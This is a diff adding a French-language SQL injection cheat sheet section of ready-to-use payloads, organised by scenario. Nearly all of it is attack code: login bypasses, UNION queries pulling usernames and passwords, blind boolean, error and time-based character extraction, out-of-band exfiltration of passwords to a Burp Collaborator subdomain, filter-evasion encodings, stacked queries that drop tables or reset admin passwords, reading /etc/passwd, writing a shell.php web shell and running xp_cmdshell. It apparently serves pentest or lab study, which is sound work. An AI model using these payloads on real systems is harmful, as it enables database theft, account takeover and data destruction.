@@ -348,5 +348,285 @@ SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.SUBDOMAIN\
 
 ---
 
+## 12. Scénarios types (par situation)
+
+!!! note "Format"
+    Payloads prêts à l'emploi par situation, génériques (Boutique/login classiques). Remplacer `TABLE`, `COLONNE`, `USERNAME` selon la cible.
+
+### 12.1 WHERE clause — récupération de données cachées
+
+- Neutraliser la fin de la condition :
+  ```sql
+  Gifts'--
+  ```
+- Étendre à toutes les lignes :
+  ```sql
+  Gifts' OR 1=1--
+  ```
+
+### 12.2 Login bypass
+
+- Commenter le check du mot de passe :
+  ```sql
+  administrator'--
+  administrator'-- (MySQL, espace final requis)
+  administrator'#     (MySQL)
+  ```
+- Bypass sans connaître le login :
+  ```sql
+  ' OR 1=1--
+  ' OR 1=1 LIMIT 1--   (MySQL/PostgreSQL)
+  ```
+- Sur le champ password directement :
+  ```sql
+  ' OR '1'='1
+  ```
+
+### 12.3 Version du SGBD — Oracle
+
+```sql
+' UNION SELECT banner, NULL FROM v$version--
+' UNION SELECT version, NULL FROM v$instance--
+```
+
+### 12.4 Version du SGBD — MySQL / Microsoft
+
+```sql
+' UNION SELECT @@version, NULL--
+```
+
+### 12.5 Contenu de la base — non-Oracle
+
+```sql
+-- Lister les tables
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+-- Lister les colonnes d'une table
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TABLE'--
+
+-- Filtrer par schéma courant (MySQL)
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
+```
+
+### 12.6 Contenu de la base — Oracle
+
+```sql
+-- Lister les tables
+' UNION SELECT table_name, NULL FROM all_tables--
+
+-- Lister les colonnes (attention : noms en MAJUSCULES)
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='TABLE'--
+```
+
+### 12.7 UNION — nombre de colonnes
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   -- incrémenter jusqu'à erreur
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--   -- incrémenter jusqu'à 200 OK
+
+' UNION SELECT NULL,NULL,NULL FROM DUAL--   -- Oracle (FROM DUAL obligatoire)
+```
+
+### 12.8 UNION — trouver une colonne texte
+
+```sql
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+```
+
+### 12.9 UNION — extraction depuis une autre table
+
+```sql
+' UNION SELECT username, password FROM users--
+' UNION SELECT NULL, username, password FROM users--   -- si 3 colonnes
+```
+
+### 12.10 UNION — plusieurs valeurs dans une seule colonne
+
+```sql
+' UNION SELECT username || ':' || password, NULL FROM users--     -- Oracle/PostgreSQL
+' UNION SELECT username+':'+password, NULL FROM users--            -- MSSQL
+' UNION SELECT CONCAT(username,':',password), NULL FROM users--    -- MySQL
+```
+
+### 12.11 Blind — réponses conditionnelles (Boolean-Based)
+
+```sql
+-- Validation
+' AND '1'='1
+' AND '1'='2
+
+-- Longueur d'une donnée
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=20--
+
+-- Extraction caractère par caractère
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+```
+
+### 12.12 Blind — erreurs conditionnelles
+
+```sql
+-- Oracle
+' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL--
+
+-- MSSQL
+' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1/0 ELSE NULL END)=1--
+
+-- PostgreSQL
+' AND 1=(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1/(SELECT 0) ELSE NULL END)--
+
+-- MySQL
+' AND IF((SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'),(SELECT table_name FROM information_schema.tables),'a')--
+```
+
+### 12.13 Error-based visible (extraction directe)
+
+```sql
+-- MSSQL
+' AND 1=(SELECT 'a' WHERE 1=1 UNION SELECT password FROM users)--
+' AND CAST((SELECT password FROM users WHERE username='admin') AS int)=1--
+
+-- PostgreSQL
+' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--
+
+-- MySQL (XPath)
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--
+' AND updatexml(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1)--
+```
+
+### 12.14 Blind — délais temporels (détection)
+
+```sql
+' AND SLEEP(5)--                    -- MySQL/MariaDB
+'; WAITFOR DELAY '0:0:5'--          -- MSSQL
+' AND pg_sleep(5)--                 -- PostgreSQL
+' AND dbms_pipe.receive_message(('a'),5) IS NULL--  -- Oracle
+```
+
+### 12.15 Blind — délais temporels + extraction
+
+```sql
+-- MySQL
+' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
+
+-- MSSQL
+'; IF ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a') WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+'; SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+-- Oracle
+'; SELECT CASE WHEN ((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a') THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual--
+```
+
+### 12.16 Blind — interaction Out-of-Band (détection)
+
+```sql
+-- MSSQL
+'; exec master..xp_dirtree '//SUBDOMAIN.burpcollaborator.net/a'--
+
+-- Oracle
+SELECT UTL_INADDR.get_host_address('SUBDOMAIN.burpcollaborator.net') FROM dual;
+SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN.burpcollaborator.net/"> %remote;]>') FROM dual;
+
+-- PostgreSQL
+copy (SELECT '') to program 'nslookup SUBDOMAIN.burpcollaborator.net';
+
+-- MySQL (Windows uniquement)
+SELECT LOAD_FILE('\\\\SUBDOMAIN.burpcollaborator.net\\a');
+```
+
+### 12.17 Blind — exfiltration Out-of-Band
+
+```sql
+-- MSSQL
+'; declare @p varchar(1024);
+set @p=(SELECT password FROM users WHERE username='administrator');
+exec('master..xp_dirtree "//'+@p+'.SUBDOMAIN.burpcollaborator.net/a"')--
+
+-- Oracle
+SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE ROWNUM=1)||'.SUBDOMAIN.burpcollaborator.net') FROM dual;
+
+-- PostgreSQL
+copy (SELECT password FROM users LIMIT 1) to program 'nslookup $(cat).SUBDOMAIN.burpcollaborator.net';
+
+-- MySQL (Windows)
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.SUBDOMAIN.burpcollaborator.net\\a'));
+```
+
+### 12.18 Filter bypass via encodage XML
+
+```xml
+<storeId>999 &#x55;NION &#x53;ELECT username, password FROM users</storeId>
+```
+
+### 12.19 Filter bypass via encodage Unicode JSON
+
+```json
+{ "storeId": "999 \u0055NION \u0053ELECT username, password FROM users" }
+```
+
+### 12.20 Filter bypass — mots-clés
+
+```sql
+SeLeCT username FrOm users;
+SELECT/**/username/**/FROM/**/users;
+/*!SELECT*/ username FROM users;
+/*!50000SELECT*/ username FROM users;
+%53ELECT username FROM users;      -- encodage URL
+SELWHERECT username FRWHEREOM users; -- double mot-clé filtré (si remplacement naïf)
+```
+
+### 12.21 Second-order SQLi
+
+```sql
+-- Phase 1 : stockage (paramétré, aucune alerte)
+display_name = administrator'--
+
+-- Phase 2 : requête reconstruite dynamiquement plus tard
+UPDATE users SET password = 'hacked123' WHERE username = 'administrator'--'
+```
+
+### 12.22 Requêtes empilées (Stacked Queries)
+
+```sql
+'; DROP TABLE logs--                          -- MSSQL / PostgreSQL
+'; INSERT INTO users (username,password) VALUES ('hacker','pwd')--
+'; UPDATE users SET password='pwn3d' WHERE username='admin'--
+```
+
+### 12.23 Extraction de fichiers (lecture/écriture, si privilèges)
+
+```sql
+-- MySQL
+SELECT LOAD_FILE('/etc/passwd');
+SELECT 'shell' INTO OUTFILE '/var/www/html/shell.php';
+
+-- MSSQL
+EXEC xp_cmdshell 'whoami';
+
+-- PostgreSQL
+CREATE TABLE tmp(data text);
+COPY tmp FROM '/etc/passwd';
+SELECT * FROM tmp;
+```
+
+### 12.24 En-têtes HTTP comme vecteur
+
+```http
+User-Agent: ' OR 1=1--
+Referer: ' OR 1=1--
+X-Forwarded-For: ' OR 1=1--
+Cookie: TrackingId=xyz' OR '1'='1
+```
+
+---
+
 !!! note "Voir aussi"
     Pour la méthodologie complète de détection (in-band, blind, OAST), les techniques UNION-based, le second-order SQLi et les contre-mesures détaillées (requêtes préparées, whitelisting), se référer à la fiche [`sqli.md`](sqli.md).
